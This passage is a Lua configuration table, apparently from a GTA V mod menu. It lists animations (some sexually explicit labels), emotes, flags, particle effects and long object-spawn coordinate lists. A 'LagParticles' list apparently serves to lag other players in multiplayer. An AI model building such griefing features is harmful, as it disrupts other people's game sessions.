                    }, {type = 'scenario', data = {anim = 'PROP_HUMAN_BBQ'}}, {
                        type = 'anim',
                        data = {
                            lib = 'mini@prostitutes@sexlow_veh',
                            anim = 'low_car_bj_to_prop_female'
                        }
                    },
                    {
                        type = 'scenario',
                        data = {anim = 'world_human_tourist_mobile'}
                    },
                    {
                        type = 'anim',
                        data = {lib = 'mini@safe_cracking', anim = 'idle_base'}
                    }
                },
                labels = {
                    'Drink a coffee', 'Sit', 'Wait against a wall',
                    'Laying on the back', 'Laying down on the chest',
                    'Clean something', 'Prepare to eat', 'Search position',
                    'Take a selfie', 'Listen to a door'
                }
            },
            PEGI18 = {
                info = {
                    {
                        type = 'anim',
                        data = {
                            lib = 'oddjobs@towing',
                            anim = 'm_blow_job_loop'
                        }
                    },
                    {
                        type = 'anim',
                        data = {
                            lib = 'oddjobs@towing',
                            anim = 'f_blow_job_loop'
                        }
                    }, {
                        type = 'anim',
                        data = {
                            lib = 'mini@prostitutes@sexlow_veh',
                            anim = 'low_car_sex_loop_player'
                        }
                    }, {
                        type = 'anim',
                        data = {
                            lib = 'mini@prostitutes@sexlow_veh',
                            anim = 'low_car_sex_loop_female'
                        }
                    }, {
                        type = 'anim',
                        data = {
                            lib = 'mp_player_int_uppergrab_crotch',
                            anim = 'mp_player_int_grab_crotch'
                        }
                    }, {
                        type = 'anim',
                        data = {
                            lib = 'mini@strip_club@idles@stripper',
                            anim = 'stripper_idle_02'
                        }
                    },
                    {
                        type = 'scenario',
                        data = {anim = 'WORLD_HUMAN_PROSTITUTE_HIGH_CLASS'}
                    }, {
                        type = 'anim',
                        data = {
                            lib = 'mini@strip_club@backroom@',
                            anim = 'stripper_b_backroom_idle_b'
                        }
                    }, {
                        type = 'anim',
                        data = {
                            lib = 'mini@strip_club@lap_dance@ld_girl_a_song_a_p1',
                            anim = 'ld_girl_a_song_a_p1_f'
                        }
                    }, {
                        type = 'anim',
                        data = {
                            lib = 'mini@strip_club@private_dance@part2',
                            anim = 'priv_dance_p2'
                        }
                    }, {
                        type = 'anim',
                        data = {
                            lib = 'mini@strip_club@private_dance@part3',
                            anim = 'priv_dance_p3'
                        }
                    }
                },
                labels = {
                    'Man Blowjob in car', 'Woman doing a blowjob in car',
                    'Man Sex in car', 'Woman fucked in car',
                    'Scratching the balls', 'Stripper idle', 'Prostitute',
                    'Show your boobs', 'Strip Tease 1', 'Strip Tease 2',
                    'Stip Tease on the ground'
                }
            }
        },
        StatsModifier = {
            Strength = 'MP%s_STRENGTH',
            Stamina = 'MP%s_STAMINA',
            Lung = 'MP%s_LUNG_CAPACITY',
            Shooting = 'MP%s_SHOOTING_ABILITY',
            Wheelie = 'MP%s_WHEELIE_ABILITY',
            Driving = 'MP%s_DRIVING_ABILITY',
            Flying = 'MP%s_FLYING_ABILITY'
        },
        EmotesList = {
            labels = {
                'Handshake', 'Handshake 2', 'Hug', 'Hug 2', 'bro', 'Punch',
                'Slap', 'Dance', 'Dance 2', 'Dance 3', 'Dance 4', 'Stick Dance',
                'Stick Dance 2', 'Dance Horse'
            },
            data = {
                {'handshake', 'handshake2'}, {'handshake2', 'handshake'},
                {'hug', 'hug2'}, {'hug2', 'hug'}, {'bro', 'bro2'},
                {'punch', 'punched'}, {'slap2', 'slapped'}, {'dance', 'dance'},
                {'dance2', 'dance2'}, {'dance3', 'dance3'},
                {'dance4', 'dance4'}, {'danceglowstick', 'danceglowstick'},
                {'danceglowstick2', 'danceglowstick2'},
                {'dancehorse', 'dancehorse'}
            }
        },
        Flags = {
            labels = {
                'Canada', 'Europe', 'France (baguette)', 'Germany', 'Ireland',
                'Japan', 'Los Santos', 'L.S.F.D', 'Los Santos Services',
                'Mexico', 'Russia', 'S.A', 'S.A.P.D', 'ScotLand', 'Sheriff',
                'United Kingdom', 'United States', 'Golf'
            },
            data = {
                'prop_flag_canada', 'prop_flag_eu', 'prop_flag_france',
                'prop_flag_german', 'prop_flag_ireland', 'prop_flag_japan',
                'prop_flag_ls', 'prop_flag_lsfd', 'prop_flag_lsservices',
                'prop_flag_mexico', 'prop_flag_russia', 'prop_flag_sa',
                'prop_flag_sapd', 'prop_flag_scotland', 'prop_flag_sheriff',
                'prop_flag_uk', 'prop_flag_us', 'prop_golfflag'
            }
        },
        LagParticles = {
            {'core', 'blood_stab'}, {'core', 'exp_grd_grenade_lod'},
            {'core', 'ent_sht_water_tower'}, {'core', 'env_snow_flakes'},
            {'core', 'exp_air_molotov'}, {'core', 'exp_air_rpg_lod'},
            {'core', 'td_blood_shotgun'}, {'core', 'ent_dst_elec_fire_sp'},
            {'core', 'veh_backfire'}
        },
        Particles = {
            scr_rcbarry2 = {
                label = 'Barry',
                labels = {
                    'Death', 'Eject', 'Explode', 'Appear', 'Appear Trails',
                    'Explode Trails', 'Clown Bul', 'Muz'
                },
                data = {
                    {'scr_rcbarry2', 'scr_clown_death'},
                    {'scr_rcbarry2', 'eject_clown'},
                    {'scr_rcbarry2', 'scr_exp_clown'},
                    {'scr_rcbarry2', 'scr_clown_appears'},
                    {'scr_rcbarry2', 'sp_clown_appear_trails'},
                    {'scr_rcbarry2', 'scr_exp_clown_trails'},
                    {'scr_rcbarry2', 'scr_clown_bul'},
                    {'scr_rcbarry2', 'muz_clown'}
                }
            },
            scr_rcextreme2 = {
                label = 'Effects',
                labels = {'Smoke', 'Blood', 'Scrape', 'Cloud', 'Splash'},
                data = {
                    {'core', 'blood_stab'}, {'core', 'exp_grd_grenade_lod'},
                    {'core', 'ent_sht_water_tower'},
                    {'core', 'ent_dst_elec_fire_sp'},
                    {'scr_rcextreme2', 'scr_extrm4_water_splash'}
                }
            },
            scr_xs_celebration = {
                label = 'Pieces',
                labels = {
                    'Money Rain', 'Money Rain 2', 'Confetti Burst',
                    'Champagne Spray', 'Beer Chug'
                },
                data = {
                    {'scr_xs_celebration', 'scr_xs_money_rain'},
                    {'scr_xs_celebration', 'scr_xs_money_rain_celeb'},
                    {'scr_xs_celebration', 'scr_xs_confetti_burst'},
                    {'scr_xs_celebration', 'scr_xs_champagne_spray'},
                    {'scr_xs_celebration', 'scr_xs_beer_chug'}
                }
            },
            scr_rcpaparazzo1 = {
                label = 'Light',
                labels = {
                    'Firework Burst', 'Camera', 'Champ Burst',
                    'Firework Spawn Trail', 'Firework Spawn'
                },
                data = {
                    {'scr_rcpaparazzo1', 'scr_mich4_firework_burst_spawn'},
                    {'scr_rcpaparazzo1', 'scr_rcpap1_camera'},
                    {'scr_rcpaparazzo1', 'scr_rcpap1_champ_burst'},
                    {'scr_rcpaparazzo1', 'scr_mich4_firework_trail_spawn'},
                    {'scr_rcpaparazzo1', 'scr_mich4_firework_trailburst_spawn'}
                }
            }
        },
        selectedParticle = {'scr_rcbarry2', 'scr_clown_death'},
        selectedParticleScale = 0.5,
        selectedParticleTime = 50,
        CraftLab = {
            Maps = {
                {
                    'MazeBank Demolition', c._vector3(-78.02, -813.79, 327.5), {
                        {
                            2475986526, -80.9087, -830.357, 325.097, -14.4264,
                            -8.53774, 152.209, -1, 0
                        },
                        {
                            2475986526, -79.2316, -831.297, 325.108, -14.4054,
                            4.26887, 164.271, -1, 0
                        },
                        {
                            2475986526, -76.7563, -831.549, 325.123, -14.4263,
                            -0, 171.818, -1, 0
                        },
                        {
                            2475986526, -74.2595, -831.691, 325.09, -14.2059,
                            -1.06722, -176.517, -1, 0
                        },
                        {
                            2475986526, -71.9478, -831.257, 325.113, -14.4264,
                            2.13443, -166.006, -1, 0
                        },
                        {
                            2475986526, -69.5981, -830.542, 325.066, -14.5918,
                            -4.26887, -155.474, -1, 0
                        },
                        {
                            2475986526, -67.4174, -829.035, 325.097, -14.4263,
                            -4.26887, -140.651, -1, 0
                        },
                        {
                            2475986526, -65.7121, -827.409, 325.068, -14.3048,
                            -1.70755, -130.667, -1, 0
                        },
                        {
                            2475986526, -64.2717, -825.422, 325.112, -14.4263,
                            -0, -121.256, -1, 0
                        },
                        {
                            2475986526, -63.2876, -823.434, 325.114, -14.5345,
                            -0, -111.446, -1, 0
                        },
                        {
                            2475986526, -62.4924, -821.128, 325.082, -14.5467,
                            2.13443, -102.385, -1, 0
                        },
                        {
                            2475986526, -62.233, -818.528, 325.065, -14.6184,
                            -8.00413, -88.1861, -1, 0
                        },
                        {
                            2475986526, -62.8694, -815.926, 325.118, -14.4265,
                            -6.4033, -76.5979, -1, 0
                        },
                        {
                            2475986526, -63.6142, -813.68, 325.112, -14.3655,
                            8.53774, -66.7885, -1, 0
                        },
                        {
                            2475986526, -64.9883, -811.439, 325.107, -14.4263,
                            1.28066, -52.8494, -1, 0
                        },
                        {
                            2475986526, -66.5913, -808.328, 325.238, -12.4517,
                            -0, -40.3246, -1, 0
                        },
                        {
                            2475986526, -68.2603, -807.899, 325.336, -13.8689,
                            -0, -33.062, -1, 0
                        },
                        {
                            2475986526, -71.1526, -807.598, 325.153, -12.0416,
                            4.26887, -28.0523, -1, 0
                        },
                        {
                            2475986526, -73.2853, -806.628, 325.151, -11.7962,
                            -0, -19.1717, -1, 0
                        },
                        {
                            2475986526, -75.2243, -806.286, 325.164, -12.0419,
                            -0, 1.55726, -1, 0
                        },
                        {
                            2475986526, -77.5757, -806.312, 325.088, -14.1843,
                            -0, 12.6263, -1, 0
                        },
                        {
                            2475986526, -79.8704, -807.22, 325.143, -14.049,
                            -4.26887, 21.4769, -1, 0
                        },
                        {
                            2475986526, -82.0222, -807.83, 325.036, -14.1422,
                            -4.26887, 32.7605, -1, 0
                        },
                        {
                            2475986526, -83.8934, -809.424, 325.073, -14.5264,
                            -8.53774, 46.5132, -1, 0
                        },
                        {
                            2475986526, -85.2523, -810.983, 325.043, -14.859,
                            -0, 53.5324, -1, 0
                        },
                        {
                            2475986526, -86.5177, -813.202, 325.089, -14.5267,
                            4.26887, 64.6634, -1, 0
                        },
                        {
                            2475986526, -87.6645, -815.707, 325.059, -14.8589,
                            4.26887, 73.157, -1, 0
                        },
                        {
                            2475986526, -87.7973, -817.987, 325.119, -14.8468,
                            -1.33402, 89.3982, -1, 0
                        },
                        {
                            2475986526, -87.5801, -821.034, 325.059, -14.8593,
                            -0, 95.4435, -1, 0
                        },
                        {
                            2475986526, -87.2815, -822.239, 325.126, -15.6308,
                            -4.26887, 100.311, -1, 0
                        },
                        {
                            2475986526, -86.7602, -824.03, 325.044, -15.9224,
                            -0, 116.957, -1, 0
                        },
                        {
                            2475986526, -85.3743, -826.099, 325.136, -15.7025,
                            2.56132, 124.307, -1, 0
                        },
                        {
                            2475986526, -83.4737, -828.611, 325.076, -15.0688,
                            -0, 132.538, -1, 0
                        },
                        {
                            2475986526, -87.9554, -832.877, 325.894, -14.1563,
                            4.26887, 132.995, -1, 0
                        },
                        {
                            2475986526, -89.3865, -831.322, 325.887, -14.1562,
                            -0, 126.154, -1, 0
                        },
                        {
                            2475986526, -86.4247, -834.407, 325.915, -14.2701,
                            4.26887, 143.277, -1, 0
                        },
                        {
                            2475986526, -85.1736, -833.789, 325.653, -14.4072,
                            -4.26887, 145.777, -1, 0
                        },
                        {
                            2475986526, -83.8118, -835.765, 326.063, -12.243,
                            4.26887, 151.527, -1, 0
                        },
                        {
                            2475986526, -80.7015, -837.145, 326.059, -12.3172,
                            2.13443, 162.332, -1, 0
                        },
                        {
                            2475986526, -77.6428, -837.649, 326.163, -10.8391,
                            3.20165, 171.297, -1, 0
                        },
                        {
                            2475986526, -75.479, -837.909, 326.025, -12.3172,
                            -1.06722, 174.574, -1, 0
                        },
                        {
                            2475986526, -73.861, -837.826, 326.061, -12.3173,
                            5.33609, -176.632, -1, 0
                        },
                        {
                            2475986526, -70.4799, -837.265, 326.09, -12.3173,
                            -0, -166.182, -1, 0
                        },
                        {
                            2475986526, -67.0415, -836.185, 326.018, -12.3171,
                            -0, -156.039, -1, 0
                        },
                        {
                            2475986526, -64.8504, -834.996, 325.951, -11.5263,
                            -0, -145.834, -1, 0
                        },
                        {
                            2475986526, -63.5702, -833.725, 326.1, -11.2947, -0,
                            -140.961, -1, 0
                        },
                        {
                            2475986526, -60.9992, -831.419, 326.075, -11.5262,
                            -4.26887, -130.963, -1, 0
                        },
                        {
                            2475986526, -58.9923, -828.729, 326.116, -11.5262,
                            4.26887, -121.973, -1, 0
                        },
                        {
                            2475986526, -57.5045, -825.626, 326.114, -11.5263,
                            -0, -110.959, -1, 0
                        },
                        {
                            2475986526, -56.5533, -822.397, 326.08, -11.1311,
                            -6.4033, -102, -1, 0
                        },
                        {
                            2475986526, -56.0911, -820.05, 326.049, -11.0325,
                            2.13443, -100.794, -1, 0
                        },
                        {
                            2475986526, -56.0681, -818.32, 326.087, -11.1312,
                            -2.66804, -87.9469, -1, 0
                        },
                        {
                            2475986526, -56.2989, -816.237, 326.048, -11.0324,
                            2.13443, -83.2139, -1, 0
                        },
                        {
                            2475986526, -56.8952, -814.518, 326.142, -11.0324,
                            -2.13443, -76.5476, -1, 0
                        },
                        {
                            2475986526, -58.1209, -811.23, 326.116, -10.9697,
                            -0, -66.7674, -1, 0
                        },
                        {
                            2475986526, -59.0622, -809.17, 326.095, -11.0574,
                            4.26887, -62.782, -1, 0
                        },
                        {
                            2475986526, -60.096, -807.639, 326.119, -11.5544,
                            -0, -52.7596, -1, 0
                        },
                        {
                            2475986526, -62.081, -805.317, 326.116, -11.1035,
                            -0, -40.7682, -1, 0
                        },
                        {
                            2475986526, -64.1466, -804.55, 326.283, -11.1035,
                            -0, -30.477, -1, 0
                        },
                        {
                            2475986526, -67.9795, -798.8, 326.717, -10.1561, -0,
                            -29.3495, -1, 0
                        },
                        {
                            2475986526, -67.5734, -802.52, 326.262, -10.471,
                            -8.53774, -31.2185, -1, 0
                        },
                        {
                            2475986526, -70.9341, -800.541, 326.198, -10.5317,
                            -0, -20.0064, -1, 0
                        },
                        {
                            2475986526, -75.3309, -801.285, 325.849, -10.2407,
                            -0, 1.58401, -1, 0
                        },
                        {
                            2475986526, -74.0222, -799.865, 326.177, -10.7327,
                            -0, -5.98314, -1, 0
                        },
                        {
                            2475986526, -76.5167, -797.998, 326.32, -12.4969,
                            -2.66804, 1.58883, -1, 0
                        },
                        {
                            2475986526, -79.2787, -800.531, 326.011, -12.9433,
                            4.26887, 13.0054, -1, 0
                        },
                        {
                            2475986526, -81.6721, -801.017, 325.9, -12.4601,
                            2.13443, 17.3792, -1, 0
                        },
                        {
                            2475986526, -83.6027, -801.744, 325.971, -12.9433,
                            -0, 26.3052, -1, 0
                        },
                        {
                            2475986526, -85.6586, -802.789, 325.95, -12.8791,
                            1.28066, 32.5856, -1, 0
                        },
                        {
                            2475986526, -87.5086, -804.25, 325.978, -12.9432,
                            4.26887, 42.3279, -1, 0
                        },
                        {
                            2475986526, -88.9923, -805.73, 325.89, -11.9333,
                            -4.26887, 46.0613, -1, 0
                        },
                        {
                            2475986526, -90.167, -807.318, 325.946, -13.0244,
                            -0, 53.178, -1, 0
                        },
                        {
                            2475986526, -93.5987, -807.353, 326.343, -11.5713,
                            4.26887, 60.8753, -1, 0
                        },
                        {
                            2475986526, -93.5166, -813.963, 325.942, -13.4341,
                            -4.26887, 73.0256, -1, 0
                        },
                        {
                            2475986526, -92.121, -810.584, 325.996, -13.4339,
                            -4.26887, 64.9353, -1, 0
                        },
                        {
                            2475986526, -93.9931, -815.866, 325.924, -13.0519,
                            -0, 79.5966, -1, 0
                        },
                        {
                            2475986526, -93.8716, -817.904, 325.988, -13.4339,
                            -0, 88.8361, -1, 0
                        },
                        {
                            2475986526, -93.7912, -821.777, 325.946, -13.6946,
                            -2.66804, 91.1427, -1, 0
                        },
                        {
                            2475986526, -93.2951, -823.554, 325.966, -13.157,
                            -0, 101.424, -1, 0
                        },
                        {
                            2475986526, -92.5757, -827.033, 325.87, -13.5323,
                            -0, 104.668, -1, 0
                        },
                        {
                            2475986526, -91.53, -828.342, 325.842, -14.1563,
                            4.26887, 120.328, -1, 0
                        },
                        {
                            2475986526, -90.5203, -829.611, 325.936, -14.1563,
                            -0, 124.573, -1, 0
                        },
                        {
                            2475986526, -95.5355, -833.068, 327.049, -9.63525,
                            1.70755, 124.512, -1, 0
                        },
                        {
                            2475986526, -94.2445, -835.1, 326.976, -9.27617,
                            -1.28066, 128.396, -1, 0
                        },
                        {
                            2475986526, -92.513, -837.087, 327.008, -9.63523,
                            -4.26887, 132.871, -1, 0
                        },
                        {
                            2475986526, -90.07, -839.341, 327.025, -9.63574,
                            4.26887, 143.545, -1, 0
                        },
                        {
                            2475986526, -86.7336, -841.135, 327.284, -9.63566,
                            -0, 150.983, -1, 0
                        },
                        {
                            2475986526, -84.8343, -842.167, 327.254, -9.36742,
                            -4.26887, 152.377, -1, 0
                        },
                        {
                            2475986526, -90.0883, -842.661, 327.589, -7.98782,
                            -8.53774, 146.409, -1, 0
                        },
                        {
                            2475986526, -82.595, -843.001, 327.277, -9.6352, -0,
                            161.654, -1, 0
                        },
                        {
                            2475986526, -80.8027, -843.618, 327.263, -9.36755,
                            -2.13443, 165.215, -1, 0
                        },
                        {
                            2475986526, -78.5619, -843.703, 327.458, -9.63545,
                            -2.13443, 171.015, -1, 0
                        },
                        {
                            2475986526, -76.2479, -844.026, 327.261, -9.36765,
                            1.06722, 175.986, -1, 0
                        },
                        {
                            2475986526, -73.5382, -843.999, 327.285, -9.6355,
                            -0, -177.212, -1, 0
                        },
                        {
                            2475986526, -71.2047, -843.988, 327.3, -9.36764,
                            -1.06722, -172.013, -1, 0
                        },
                        {
                            2475986526, -69.036, -843.266, 327.309, -9.63525,
                            4.26887, -166.686, -1, 0
                        },
                        {
                            2475986526, -67.2981, -840.996, 326.756, -9.37509,
                            -2.13443, -159.014, -1, 0
                        },
                        {
                            2475986526, -66.7067, -842.714, 327.222, -9.37501,
                            2.13443, -159.27, -1, 0
                        },
                        {
                            2475986526, -64.5693, -841.792, 327.24, -9.63515,
                            4.26887, -156.16, -1, 0
                        },
                        {
                            2475986526, -61.8874, -840.436, 327.231, -9.37483,
                            4.26887, -146.534, -1, 0
                        },
                        {
                            2475986526, -59.7118, -838.501, 327.384, -9.63533,
                            -0, -141.372, -1, 0
                        },
                        {
                            2475986526, -57.9491, -837.16, 327.309, -9.37471,
                            4.26887, -135.839, -1, 0
                        },
                        {
                            2475986526, -56.3494, -835.471, 327.34, -9.63578,
                            4.26887, -131.675, -1, 0
                        },
                        {
                            2475986526, -54.9387, -833.93, 327.334, -9.37482,
                            -0, -127.887, -1, 0
                        },
                        {
                            2475986526, -53.727, -832.032, 327.367, -9.63521,
                            -4.26887, -122.142, -1, 0
                        },
                        {
                            2475986526, -52.5928, -830.077, 327.332, -9.37496,
                            -0, -116.843, -1, 0
                        },
                        {
                            2475986526, -51.7552, -827.819, 327.385, -9.63569,
                            6.4033, -111.077, -1, 0
                        },
                        {
                            2475986526, -51.0061, -825.839, 327.369, -9.37494,
                            4.26887, -107.054, -1, 0
                        },
                        {
                            2475986526, -50.5468, -823.622, 327.378, -9.63572,
                            4.26887, -101.598, -1, 0
                        },
                        {
                            2475986526, -50.0992, -820.896, 327.345, -9.47333,
                            -1.06722, -95.7976, -1, 0
                        },
                        {
                            2475986526, -49.9295, -818.102, 327.381, -9.63531,
                            -8.00413, -88.2146, -1, 0
                        },
                        {
                            2475986526, -50.1895, -815.816, 327.358, -9.4734,
                            -0, -82.8649, -1, 0
                        },
                        {
                            2475986526, -50.9164, -813.132, 327.442, -9.63524,
                            2.13443, -76.865, -1, 0
                        },
                        {
                            2475986526, -51.1585, -811.568, 327.373, -9.58574,
                            -0, -69.3402, -1, 0
                        },
                        {
                            2475986526, -52.0622, -809.533, 327.354, -9.63541,
                            2.13443, -65.7624, -1, 0
                        },
                        {
                            2475986526, -53.4048, -806.624, 327.376, -9.63526,
                            2.13443, -65.3971, -1, 0
                        },
                        {
                            2475986526, -55.2978, -803.815, 327.389, -9.63524,
                            4.26887, -52.2107, -1, 0
                        },
                        {
                            2475986526, -56.5179, -802.266, 327.366, -9.51013,
                            4.26887, -50.6537, -1, 0
                        },
                        {
                            2475986526, -57.9995, -800.68, 327.42, -9.6353,
                            1.28066, -41.7027, -1, 0
                        },
                        {
                            2475986526, -61.0278, -799.404, 327.549, -9.63516,
                            8.53774, -31.016, -1, 0
                        },
                        {
                            2475986526, -64.37, -797.284, 327.603, -9.6351, -0,
                            -31.6732, -1, 0
                        },
                        {
                            2475986526, -66.3998, -795.965, 327.526, -9.42422,
                            8.53773, -29.018, -1, 0
                        },
                        {
                            2475986526, -68.8079, -794.744, 327.535, -9.63558,
                            -2.13443, -20.0341, -1, 0
                        },
                        {
                            2475986526, -72.1225, -793.825, 327.497, -9.57894,
                            -2.13443, -12.2336, -1, 0
                        },
                        {
                            2475986526, -75.6415, -795.169, 327.2, -9.63555,
                            -1.60083, 2.8097, -1, 0
                        },
                        {
                            2475986526, -77.9613, -794.235, 327.223, -8.9769,
                            -5.33608, 4.53814, -1, 0
                        }, {
                            2475986526, -75.3695, -789.507, 328.306, -8.84722,
                            -8.33763, -0.0879073, -1, 0
                        },
                        {
                            2475986526, -80.6908, -794.505, 327.217, -9.63537,
                            4.26887, 13.0745, -1, 0
                        },
                        {
                            2475986526, -83.5673, -795.148, 327.101, -9.92985,
                            2.13443, 17.5819, -1, 0
                        },
                        {
                            2475986526, -86.3087, -796.203, 327.177, -9.63542,
                            -4.26887, 25.9296, -1, 0
                        },
                        {
                            2475986526, -88.9655, -797.634, 327.118, -9.92994,
                            -4.26887, 33.0571, -1, 0
                        },
                        {
                            2475986526, -91.6251, -799.702, 327.176, -9.63539,
                            -0, 42.2513, -1, 0
                        },
                        {
                            2475986526, -93.414, -801.299, 327.124, -9.92995,
                            -0, 48.7085, -1, 0
                        },
                        {
                            2475986526, -95.1453, -803.637, 327.147, -9.63537,
                            -8.53774, 53.6544, -1, 0
                        },
                        {
                            2475986526, -96.5885, -805.701, 327.144, -9.8947,
                            -0, 60.5096, -1, 0
                        },
                        {
                            2475986526, -97.6945, -807.971, 327.174, -9.63569,
                            4.26887, 64.7568, -1, 0
                        },
                        {
                            2475986526, -98.7075, -809.885, 327.026, -8.13758,
                            -0, 67.8881, -1, 0
                        },
                        {
                            2475986526, -99.394, -812.176, 327.105, -9.63525,
                            -4.26887, 73.0223, -1, 0
                        },
                        {
                            2475986526, -100.025, -814.868, 327.097, -9.97277,
                            2.13443, 83.1537, -1, 0
                        },
                        {
                            2475986526, -100.012, -817.789, 327.15, -9.63535,
                            -1.33402, 88.8234, -1, 0
                        },
                        {
                            2475986526, -100.069, -819.76, 327.099, -9.95297,
                            -1.33402, 90.8729, -1, 0
                        },
                        {
                            2475986526, -99.969, -821.91, 327.11, -9.63541,
                            -2.66804, 91.5501, -1, 0
                        },
                        {
                            2475986526, -99.3358, -824.801, 327.138, -9.63539,
                            2.13443, 101.678, -1, 0
                        },
                        {
                            2475986526, -98.5443, -828.598, 327.033, -9.63553,
                            -0, 104.64, -1, 0
                        },
                        {
                            2475986526, -97.0896, -831.054, 326.937, -10.0741,
                            4.26887, 118.72, -1, 0
                        },
                        {
                            2475986526, -102.435, -833.952, 328.506, -5.26399,
                            -0, 118.502, -1, 0
                        },
                        {
                            2475986526, -103.536, -831.932, 328.513, -5.42142,
                            4.26887, 111.099, -1, 0
                        },
                        {
                            2475986526, -100.644, -836.571, 328.636, -5.26398,
                            -0, 124.006, -1, 0
                        },
                        {
                            2475986526, -99.0448, -838.912, 328.589, -5.26395,
                            -2.13443, 128.175, -1, 0
                        },
                        {
                            2475986526, -96.9401, -841.184, 328.589, -5.26384,
                            -2.13443, 132.615, -1, 0
                        },
                        {
                            2475986526, -95.4409, -842.718, 328.551, -5.01006,
                            -2.13443, 136.57, -1, 0
                        },
                        {
                            2475986526, -93.6584, -844.231, 328.606, -5.26388,
                            -0, 143.429, -1, 0
                        },
                        {
                            2475986526, -92.1044, -845.82, 328.655, -5.01307,
                            -2.13443, 147.428, -1, 0
                        },
                        {
                            2475986526, -89.6061, -846.328, 328.851, -5.26389,
                            -0, 150.62, -1, 0
                        },
                        {
                            2475986526, -87.5884, -847.552, 328.829, -5.6777,
                            -0, 153.36, -1, 0
                        },
                        {
                            2475986526, -84.5215, -848.802, 328.867, -5.26405,
                            5.33608, 161.164, -1, 0
                        },
                        {
                            2475986526, -81.9779, -849.605, 328.821, -5.67769,
                            1.06722, 166.961, -1, 0
                        },
                        {
                            2475986526, -79.5282, -849.717, 329.046, -5.26392,
                            1.06722, 170.517, -1, 0
                        },
                        {
                            2475986526, -76.7555, -850.113, 328.885, -4.93224,
                            2.66804, 175.995, -1, 0
                        },
                        {
                            2475986526, -73.2336, -850.06, 328.883, -5.26397,
                            -0, -177.431, -1, 0
                        },
                        {
                            2475986526, -70.4067, -849.836, 328.854, -4.82287,
                            -5.33608, -172.2, -1, 0
                        },
                        {
                            2475986526, -67.6252, -849.166, 328.911, -5.26394,
                            -0, -166.741, -1, 0
                        },
                        {
                            2475986526, -64.6525, -848.331, 328.792, -4.82267,
                            -2.13443, -160.74, -1, 0
                        },
                        {
                            2475986526, -62.1086, -847.355, 328.837, -5.26389,
                            2.13443, -156.346, -1, 0
                        },
                        {
                            2475986526, -60.2755, -846.895, 328.808, -5.97307,
                            -2.13443, -151.031, -1, 0
                        },
                        {
                            2475986526, -58.5152, -845.543, 328.833, -5.26392,
                            1.06722, -147.129, -1, 0
                        },
                        {
                            2475986526, -55.9339, -843.258, 328.987, -5.26394,
                            2.13443, -141.8, -1, 0
                        },
                        {
                            2475986526, -53.6636, -841.564, 328.905, -5.18348,
                            -0, -136.192, -1, 0
                        },
                        {
                            2475986526, -51.8013, -839.526, 328.926, -5.26393,
                            -2.13443, -131.788, -1, 0
                        },
                        {
                            2475986526, -49.9112, -837.51, 328.916, -5.18352,
                            -8.53774, -125.894, -1, 0
                        },
                        {
                            2475986526, -48.5833, -835.261, 328.968, -5.26388,
                            2.13443, -122.598, -1, 0
                        },
                        {
                            2475986526, -47.1369, -832.806, 328.936, -5.18352,
                            -0, -117.146, -1, 0
                        },
                        {
                            2475986526, -46.1092, -830.019, 328.985, -5.26389,
                            -0, -111.097, -1, 0
                        },
                        {
                            2475986526, -45.2549, -827.659, 328.957, -5.18353,
                            -1.06722, -105.915, -1, 0
                        },
                        {
                            2475986526, -44.5598, -824.856, 328.973, -5.26387,
                            -0, -101.582, -1, 0
                        },
                        {
                            2475986526, -44.0346, -821.522, 328.953, -5.26387,
                            5.33608, -95.978, -1, 0
                        },
                        {
                            2475986526, -43.8673, -817.92, 328.98, -5.26387,
                            -4.00206, -88.1556, -1, 0
                        },
                        {
                            2475986526, -44.1983, -815.072, 328.956, -5.26387,
                            -0, -82.8806, -1, 0
                        },
                        {
                            2475986526, -45.0463, -811.788, 329.021, -5.26392,
                            -0, -77.2513, -1, 0
                        },
                        {
                            2475986526, -45.6154, -809.566, 328.95, -5.25705,
                            -2.13443, -72.2094, -1, 0
                        },
                        {
                            2475986526, -46.5685, -807.149, 328.929, -5.26395,
                            -2.13443, -66.9958, -1, 0
                        },
                        {
                            2475986526, -47.9752, -804.122, 328.959, -5.26398,
                            -0, -65.1505, -1, 0
                        },
                        {
                            2475986526, -49.0785, -802.078, 328.914, -5.31539,
                            4.26887, -57.7224, -1, 0
                        },
                        {
                            2475986526, -50.5092, -800.141, 328.99, -5.26406,
                            -0, -52.4683, -1, 0
                        },
                        {
                            2475986526, -52.041, -798.134, 329.001, -5.31536,
                            -2.13443, -49.2493, -1, 0
                        },
                        {
                            2475986526, -53.8808, -796.134, 329.041, -5.26389,
                            -0, -42.3308, -1, 0
                        },
                        {
                            2475986526, -55.4375, -794.682, 329.045, -5.32055,
                            2.13443, -37.3601, -1, 0
                        },
                        {
                            2475986526, -57.7537, -794.2, 329.16, -5.26393,
                            2.13443, -32.2267, -1, 0
                        },
                        {
                            2475986526, -61.0299, -792.042, 329.172, -5.26389,
                            -2.13443, -32.1174, -1, 0
                        },
                        {
                            2475986526, -63.5163, -790.736, 329.085, -5.04535,
                            -4.26887, -29.2933, -1, 0
                        },
                        {
                            2475986526, -64.7324, -789.882, 329.081, -4.987,
                            -2.13443, -27.7917, -1, 0
                        },
                        {
                            2475986526, -66.7775, -788.94, 329.155, -5.04558,
                            1.06722, -19.5666, -1, 0
                        },
                        {
                            2475986526, -68.6555, -788.272, 329.103, -5.30654,
                            3.20165, -16.9146, -1, 0
                        },
                        {
                            2475986526, -70.8259, -787.837, 329.128, -5.04546,
                            1.06722, -12.2941, -1, 0
                        },
                        {
                            2475986526, -74.5572, -787.022, 329.08, -4.61724,
                            1.06722, -10.7316, -1, 0
                        },
                        {
                            2475986526, -75.8754, -788.646, 328.671, -6.78921,
                            -0, 2.98721, -1, 0
                        },
                        {
                            2475986526, -78.4, -788.132, 328.83, -5.91899,
                            2.66804, 3.75875, -1, 0
                        },
                        {
                            2475986526, -80.5351, -788.179, 328.782, -5.80051,
                            -0, 7.26539, -1, 0
                        },
                        {
                            2475986526, -82.1189, -788.558, 328.793, -5.9192,
                            1.06722, 12.7168, -1, 0
                        },
                        {
                            2475986526, -85.4054, -789.317, 328.666, -5.79433,
                            -0, 17.1877, -1, 0
                        },
                        {
                            2475986526, -87.4651, -789.98, 328.647, -5.63204,
                            -0, 20.2315, -1, 0
                        },
                        {
                            2475986526, -88.9795, -790.697, 328.76, -5.79416,
                            -0, 25.9501, -1, 0
                        },
                        {
                            2475986526, -90.9922, -791.487, 328.684, -6.26149,
                            -0, 27.0819, -1, 0
                        },
                        {
                            2475986526, -92.3298, -792.474, 328.677, -5.79412,
                            -0, 33.3113, -1, 0
                        },
                        {
                            2475986526, -94.2322, -793.73, 328.669, -5.58479,
                            -2.13443, 37.4974, -1, 0
                        },
                        {
                            2475986526, -95.7282, -795.2, 328.764, -5.79431, -0,
